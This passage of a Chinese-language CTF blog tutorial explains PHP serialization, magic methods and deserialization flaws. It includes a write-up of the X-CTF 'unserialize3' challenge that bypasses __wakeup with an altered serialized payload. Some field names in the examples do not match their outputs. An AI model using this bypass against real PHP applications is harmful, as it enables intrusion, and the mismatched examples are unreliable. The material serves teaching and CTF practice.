class="hljs-number">1</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> =<span class="hljs-string">&quot;admin&quot;</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&quot;admins&quot;</span>;<br> &#125;<br><span class="hljs-variable">$m</span>=<span class="hljs-keyword">new</span> Test();<br><span class="hljs-variable">$m</span>-&gt;id=<span class="hljs-number">2</span>;<br><span class="hljs-variable">$m</span>-&gt;name=<span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$m</span>-&gt;password=<span class="hljs-string">&quot;roots&quot;</span>;<br><br><span class="hljs-variable">$val</span> = serialize(<span class="hljs-variable">$m</span>);<br><span class="hljs-variable">$Nm</span>=unserialize(<span class="hljs-variable">$val</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$Nm</span>-&gt;name.<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$Nm</span>-&gt;id;<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出结果：<br><img src="https://img-blog.csdnimg.cn/20201012205513840.png#pic_center" alt="在这里插入图片描述"><br><a href="https://www.w3cschool.cn/tools/index?name=unserialize">php在线反序列化工具</a><br><img src="https://img-blog.csdnimg.cn/2020101221001958.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="魔术函数"><a href="#魔术函数" class="headerlink" title="魔术函数"></a>魔术函数</h2><p>PHP面向对象变成中，有一类函数叫做魔术函数。这些函数是以<code>__</code>开头的，依照某些规则实例化类或者调用某些函数的时候会自动调用这些magic函数，</p><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>__wakeup()</td><td>触发unserialize()方法时会被调用</td></tr><tr><td>__sleep()</td><td>触发serialize()方法时会被调用</td></tr><tr><td>__construct()</td><td>创建一个对象时会被调用</td></tr><tr><td>__destruct()</td><td>销毁一个对象时会被调用</td></tr><tr><td>__get()</td><td>调出不可访问（private，protect等修饰）属性时会被调用。</td></tr><tr><td>__set()</td><td>修改或写入不可访问（private，protect等修饰）属性时会被调用。</td></tr><tr><td>__toString()</td><td>类对象被当作一个字符串使用时会被调用。</td></tr><tr><td>__isset()</td><td>对不可访问（private，protect等修饰）属性使用empty()或isset()方法时会被调用。</td></tr><tr><td>__unset（）</td><td>对不可访问（private，protect等修饰）属性使用unset()方法时会被调用。</td></tr><tr><td>__invoke()</td><td>将实例化对象当作方法使用时会被调用。</td></tr></tbody></table><h2 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h2><h3 id="wakeup-和-sleep"><a href="#wakeup-和-sleep" class="headerlink" title="__wakeup()和__sleep()"></a>__wakeup()和__sleep()</h3><blockquote><p>   <strong>PHP __wakeup()函数漏洞</strong><br>   在程序执行前，serialize() 函数会首先检查是否存在一个魔术方法 __sleep。如果存在，__sleep()方法会先被调用， 然后才执行串行化（序列化）操作。<br>   这个功能可以用于清理对象，并返回一个包含对象中所有变量名称的数组。如果该方法不返回任何内容，则NULL被序列化，导致一个E_NOTICE错误。与之相反，unserialize()会检查是否存在一个__wakeup方法。<br>   如果存在，则会先调用__wakeup方法，预先准备对象数据。但是这个wakeup()是可以被绕过的__wakeup 触发于 unserilize() 调用之前, 当反序列化时的字符串所对应的对象的数目被修改,__wake 的函数就不会被调用. 并且不会重建为对象, 但是会触发其他的魔术方法比如__destruct。</p></blockquote><p>来一道题</p><p> <strong><em>[X-CTF]unserialize3</em></strong><br>题目源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;111&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;bad requests&#x27;</span>);<br>&#125;<br>?code=<br></code></pre></td></tr></table></figure><p>打开题目，进行代码审计，可以看到xctf类只拥有一个public的flag变量，值为111。对xctf类进行序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123; <br><span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;111&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;bad requests&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-variable">$test</span>=<span class="hljs-keyword">new</span> xctf();<br><span class="hljs-keyword">echo</span>(serialize(<span class="hljs-variable">$test</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>序列化后的结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;xctf&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;flag&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;111&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>直接传参给code的结果<br><img src="https://img-blog.csdnimg.cn/20201014185510234.png#pic_center" alt="在这里插入图片描述"><br>我们要绕过<code>__wakeup</code>这个魔术函数，利用反序列化漏洞，当序列化字符串中表示对象属性个数的值大于真实的属性个数时会绕过<code>__wakeup</code>的执行</p><p>将上面的序列化后字符串，对象属性个数由真实值1修改为2。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;xctf&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;flag&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;111&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020101419075342.png#pic_center" alt="在这里插入图片描述"></p><h2 id="序列化参数"><a href="#序列化参数" class="headerlink" title="序列化参数"></a>序列化参数</h2><p>序列化参数有三种，分别是public、protected和private，三者在序列化时有明显的区别。</p><h3 id="public"><a href="#public" class="headerlink" title="public"></a>public</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test2</span>=<span class="hljs-string">&quot;hello&quot;</span>;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> test();<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$test</span>);  <br></code></pre></td></tr></table></figure><p>运行结果：<br><img src="https://img-blog.csdnimg.cn/20201123231004661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>而在网页中运行的结果:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;test1&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;hello&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>public序列化后的参数变成 <code>test1</code></p><h3 id="private"><a href="#private" class="headerlink" title="private"></a>private</h3><blockquote><p>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度。其中 \0 字符也是计算长度的。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$test1</span>=<span class="hljs-string">&quot;hello&quot;</span>;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> test();<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$test</span>);  <br></code></pre></td></tr></table></figure><p>运行结果：<br><img src="https://img-blog.csdnimg.cn/20201123231030686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>而在网页中运行的结果:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;\00test\00test2&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;hello&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>private序列化后的参数被反序列化后变成 <code>\00test\00test2</code> </p><h3 id="protected"><a href="#protected" class="headerlink" title="protected"></a>protected</h3><blockquote><p>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上\0<em>\0的前缀。这里的 \0 表示 ASCII 码为 0 的字符(不可见字符)，而不是 \0组合。这也许解释了，为什么如果直接在网址上，传递\0</em>\0username会报错，因为实际上并不是\0，只是用它来代替ASCII值为0的字符。必须用python传值才可以。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$test3</span>=<span class="hljs-string">&quot;hello&quot;</span>;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> test();<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$test</span>);  <br></code></pre></td></tr></table></figure><p>运行结果：<br><img src="https://img-blog.csdnimg.cn/20201123230813337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>而在网页中运行的结果:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;\00*\00test3&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;hello&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>protected序列化后的参数变成 <code>\00*\00test3</code></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：PHP反序列化&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://atkx.top/categories/CTF/"/>
    
    <category term="WEB" scheme="http://atkx.top/categories/CTF/WEB/"/>
    
    
    <category term="PHP" scheme="http://atkx.top/tags/PHP/"/>
    
  </entry>
  
</feed>
